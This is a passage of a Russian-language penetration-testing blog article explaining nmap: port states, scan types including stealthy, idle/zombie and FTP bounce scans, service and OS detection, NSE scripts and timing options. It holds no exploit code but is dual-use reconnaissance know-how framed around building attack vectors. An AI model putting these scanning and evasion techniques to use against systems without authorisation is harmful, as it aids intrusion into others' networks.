<p>Существует шесть состояний сетевых портов по концепции сканирования с помощью nmap:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">открыт (open)</code>:</li>
</ul>

<p>Приложение принимает запросы на TCP соединение или UDP пакеты на этот порт. Обнаружение этого состояния обычно является основной целью сканирования. Открытый порт - это прямая дверь для исследователя безопасности в систему. Уязвимость, находящаяся в программном обеспечении, взаимодействующем с данным портом, может нанести неплохой ущерб системе в результате успешной компрометации.</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">закрыт (closed)</code>:</li>
</ul>

<p>Закрытый порт доступен, но не используется каким-либо приложением. Они могут быть полезны для установления, что по заданному IP адресу есть работающий хост (определение хостов, ping сканирование), или для определения ОС. Так как эти порты достижимы, может быть полезным произвести сканирование позже, потому что некоторые из них могут открыться. Администраторы могут заблокировать такие порты с помощью брандмауэров. Тогда их состояние будет определено как фильтруется, что обсуждается далее.</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">фильтруется (filtered)</code>:</li>
</ul>

<p>Нельзя определить, открыт ли порт, так как фильтрация пакетов не позволяет достичь запросам nmap этого порта. Фильтрация может осуществляться выделенным брандмауэром, правилами роутера или брандмауэром на целевой машине. Эти порты бесполезны для атакующих, потому что предоставляют очень мало информации. Иногда они отвечают ICMP сообщениями об ошибке, такими как тип 3 код 13 (destination unreachable: communication administratively prohibited (цель назначения недоступна: связь запрещена администратором)), но чаще встречаются фильтры, которые отбрасывают запросы без предоставления какой-либо информации. Для этого нужно сделать еще несколько запросов, чтобы убедиться, что запрос был отброшен фильтром, а не затором в сети. Это очень сильно замедляет сканирование.</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">не фильтруется (unfiltered)</code>:</li>
</ul>

<p>Это состояние означает, что порт доступен, но нельзя определить открыт он или закрыт. Только ACK сканирование, используемое для определения правил брандмауэра, может охарактеризовать порт этим состоянием. Сканирование не фильтруемых портов другими способами, такими как Window сканирование, SYN сканирование или FIN сканирование может помочь определить, является ли порт открытым.</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">открыт|фильтруется (open|filtered)</code>:</li>
</ul>

<p>Характеризуется порт таким состоянием, когда не может определить открыт порт или фильтруется. Это состояние возникает при таких типах сканирования, при которых открытые порты не отвечают. Отсутствие ответа также может означать, что пакетный фильтр не пропустил запрос или ответ не был получен. При сканировании UDP, по IP протоколу, FIN, NULL, а также Xmas порт может быть охарактеризован таким состоянием.</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">закрыт|фильтруется (closed|filtered)</code>:</li>
</ul>

<p>Это состояние используется, когда нельзя определить закрыт порт или фильтруется. Используется только при сканировании IP ID idle типа.</p>

<p>Все описанные методы сканирования портов осуществляются благодаря следующим опциям nmap:</p>

<p>Сканирование состояний TCP портов:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">TCP SYN</code> сканирование (<code class="language-plaintext highlighter-rouge">-sS</code>): сканирование, при котором устанавливается не полное TCP соединение. Из плюсов данный метод позволяет быстро сканировать порты и при этом оставаться относительно скрытным из - за самой особенности неполного установления соединения. Из минусов данный тип сканирования не гарантирует достоверность информации о соединении портов, так как соединение не устанавливается полноценно и на деле сетевой порт может блокировать установленное соединение. Данный метод сканирование используется nmap по умолчанию, если оно запускается с правами суперпользователя или администратора.</li>
  <li><code class="language-plaintext highlighter-rouge">TCP FULL</code> сканирование с использованием системного вызова connect (<code class="language-plaintext highlighter-rouge">-sT</code>): сканирование, при котором устанавливается полноценное TCP соединение по указанному порту с помощью системного вызова connect. Из плюсов данный тип сканирования даёт достоверную информацию о состоянии сетевых портов за счёт установленного полноценного соединения. Из минусов данный метод сканирования сильно медленен, что ощутимо при сканировании большого количества сетевых портов. Данный метод сканирование используется nmap по умолчанию, если оно запускается с правами обычного пользователя.</li>
  <li>Сканирование с помощью кастомизации флагов: данный тип сканирования родился из особенностей реализации протоколов по соглашению RFC. Суть метода в том что открылось/закрылось порта можно выявить с помощью особенности: любой пакет, не содержащий установленного бита SYN, RST или ACK, повлечет за собой отправку RST в ответ в случае, если порт закрыт, или не повлечет никакого ответа, если порт открыт. Если ни один из этих битов не установлен, то любая комбинация трех оставшихся (FIN, PSH и URG) будет являться правильной. В nmap для этого используются следующие опции:</li>
</ul>

<p>  - <code class="language-plaintext highlighter-rouge">Null</code> сканирование (<code class="language-plaintext highlighter-rouge">-sN</code>): не устанавливаются никакие биты (Флагов в TCP заголовке 0).</p>

<p>  - <code class="language-plaintext highlighter-rouge">FIN</code> сканирование (<code class="language-plaintext highlighter-rouge">-sF</code>): устанавливается только TCP FIN бит.</p>

<p>  - <code class="language-plaintext highlighter-rouge">Xmas</code> сканирование (<code class="language-plaintext highlighter-rouge">-sX</code>): устанавливаются FIN, PSH и URG флаги.</p>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">TCP ACK</code> сканирование (<code class="language-plaintext highlighter-rouge">-sA</code>): данный тип сканирование направлен на изучение особенностей реагирования Firewall. Если порт не фильтруется, то будет возвращаться TCP ответ с флагом RST.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">TCP Window</code> сканирование (<code class="language-plaintext highlighter-rouge">-sW</code>): данный тип сканирование похож сутью работы на TCP ACK, но при этом способен отпределять, закрыт или открыт порт за счёт анализа поля TCP Window в RST ответе. В некоторых системах открытые порты используют положительное значение этого поля (даже в RST пакетах), а закрытые - нулевое.</p>
  </li>
  <li><code class="language-plaintext highlighter-rouge">TCP сканирование Мэймона</code> (<code class="language-plaintext highlighter-rouge">-sM</code>): этот тип сканирования носит имя своего первооткрывателя, Уриела Мэймона. Техника практически такая же как и при NULL, FIN и Xmas сканирования, только в качестве запросов используются запросы FIN/ACK. Согласно RFC 793 (TCP), в ответ на такой запрос должен быть сгенерирован RST пакет, если порт открыт или закрыт. Однако многие BSD системы просто отбрасывают пакет, если порт открыт.</li>
  <li><code class="language-plaintext highlighter-rouge">Зомби сканирование</code> (<code class="language-plaintext highlighter-rouge">-sI</code>): данный метод сканирование позволяет полностью анонимно просканировать хост на информацию о состояние портов, так как сканирование происходит от лица другого хоста.</li>
  <li><code class="language-plaintext highlighter-rouge">FTP bounce сканирование</code> (<code class="language-plaintext highlighter-rouge">-b</code>): данный метод сканирования основан на возможности одного FTP сервера обмениваться файлами с другим FTP сервером. Данный метод сканирования позволяет достигнуть анонимности, но сейчас крайне мало шансов, что этот метод сработает, так как многие FTP сервера переконфигурированы так, что они не могут отправлять между собой файлы.</li>
</ul>

<p>Сканирование состояния UDP портов осуществляется с помощью опции <code class="language-plaintext highlighter-rouge">-sU</code>.</p>

<p>При этом сканируя состояния сетевых портов мы так же можем довольно точно предположить какая именно сетевая служба прослушивает данный порт. Можно узнать службу и её версию по её ответу, который уникален для данной службы и её версии. В таком случае нужная информация выводится на основе перебора ответа по известной базе. Так же в качестве особенностей работы протокола RPC можно узнать сетевые службы на портах. С помощью NULL команд программы SunRPC происходит определение RPC портов. В случае их нахождения происходит опрос на список ПО, которые используют данный порт. При этом передаются различные метаданные ПО, такие как версия ПО. Для первого способа используется опция <code class="language-plaintext highlighter-rouge">-sV</code>, а для второго <code class="language-plaintext highlighter-rouge">-sR</code>. Так же не мало известный факт, что исторически да определёнными номерами сетевых портов закреплены свои сетевые службы, такие как 80 - HTTP, 25 - SMTP и так далее.</p>

<p>Так же иногда при сканировании портов у хоста используется хост с IPv6, а не IPv4. Для сканирования хоста с IPv6 в nmap можно использовать опцию <code class="language-plaintext highlighter-rouge">-6</code>.</p>

<p>При сканировании портов nmap всегда сначала пытается проверить доступность хоста с помощью ICMP пакетов и если хост не отвечает, то сканирование портов не происходит. Что бы отключить эту особенность существует опция <code class="language-plaintext highlighter-rouge">-Pn</code>.</p>

<p>В заключении касаемо изучения анализа состояний сетевых портов стоит добавить, что благодаря агрессивному режиму сканирования, который активируется с помощью опции <code class="language-plaintext highlighter-rouge">-А</code>, можно более эффективно определять протокы прикладного уровня модели TCP/IP на не стандартных сетевых портах.</p>

<h4 id="сказ-о-том-как-nmap-определяет-версии-ос-хоста">Сказ о том, как nmap определяет версии ОС хоста</h4>

<p>Определение версии ОС хоста основано на TCP/IP. Один за другим отправляются несколько пакетов-проб на известные открытые и закрытые порты машины и анализирует ответы. Эти пробы основаны на различных неоднозначностях в RFC сетевых протоколов, приводящим к различности ответов с разных ОС. После создания проб и сравнения результатов с базой данных отпечатков ОС, определяется версия системы. Обычные техники определения ОС основаны на анализе:</p>

<ul>
  <li>Значений IP TTL, IP ID</li>
  <li>Размера окна TCP, опции TCP</li>
  <li>DHCP, ICMP запросы</li>
  <li>HTTP пакеты (подстановка различных значений User-agent)</li>
  <li>MDNS ARP / NDP / SEND DNLA UPNP – SSDP M-SEARCH Bonjour / Zeroconf NetBIOS SSH / SSL / TLS SDP SNMP</li>
</ul>

<p>Также, версию ОС можно определить, получив информацию об сервисах, запущенных на хосте - многие сервисы платформо-зависимы и факт их присутствия на хосте указывает на определенную ОС.</p>

<p>Определяется информация об опрерационной системе на хосте за счёт добавлении опции -О при сканировании совместно с выводом подробной информации с помощью опции -v (или при выводе ещё более подробной информации с помощью <code class="language-plaintext highlighter-rouge">--vv</code>).</p>

<h4 id="незабытое-но-сказанное">Незабытое, но сказанное</h4>

<p>На самом деле возможности nmap чуть ли не безграничны, уместить всё в формат одной статьи звучит довольно безумно. Однако осталось ещё пара моментов, которые не освещены, но которые крайне желательно описать. Так nmap на борту поддерживает свой скриптовый движок NSE. Скрипты, написанные под данный движок, способны выполнять те или иные действия по отношению к найденным сетевым портам. Применение распространённых скриптов осуществляется с помощью опции -sC, а использование каких-то конкретных скриптов с помощью опции <code class="language-plaintext highlighter-rouge">--script</code>.</p>

<p>В nmap есть множество способов оптимизировать поиск тех или иных живых хостов и живых портов на них. Как пример это манипулирование с интенсивностью сканирования с помощью опции таймингов <code class="language-plaintext highlighter-rouge">-Т</code>: <code class="language-plaintext highlighter-rouge">-T0</code>, <code class="language-plaintext highlighter-rouge">-T1</code>, <code class="language-plaintext highlighter-rouge">-T2</code>, <code class="language-plaintext highlighter-rouge">-T3</code>, <code class="language-plaintext highlighter-rouge">-T4</code>, <code class="language-plaintext highlighter-rouge">-T5</code>, которые изменяют интервал между сетевыми запросами (чем выше число, тем меньше интервалы между запросами и тем быстрее выполнится скан) Возможные варианты: paranoid(0), sneaky(1), polite(2), normal(3), aggressive(4) и insane(5). Первые два помогают уклоняться от идентификации атакующего. 2 режим замедляет сканирование. 3 режим это по умолчанию, то есть никакой оптимизации не будет по данной опции. 4 режим ускоряет сканирование. 5 режим очень быстро сканирует, но есть вероятность в потере точности при сканировании. Так же при сканировании сетевых портов можно сканировать состояния сетевых портов с помощью выборки из топ по популярности сетевых портов c помощью опции –top-ports.</p>

<p>Стоит помнить, что nmap это сетевой сканер, и тем самым он неминуемо будет излишне шуметь. Тем не менее в умелых руках исследователя по безопасности данный сканер позволяет творить чудеса и выстраивать интересные вектора атак. В данной статье многое не было рассмотрено, как пример это формат ввода и вывода данных, разные мелкие настройки. В цели статьи не входит описание всего, однако всегда за более подробной информацией можно обратиться к <a href="https://nmap.org/man/ru/">документации</a>. Удачных исследований и векторов атак, самурай!</p>]]></content><author><name></name></author><category term="recon" /><category term="nmap" /><category term="recon" /><category term="network" /><summary type="html"><![CDATA[nmap: утилита, способная стать маяком для пентестера при исследовании корпоративной сети]]></summary></entry></feed>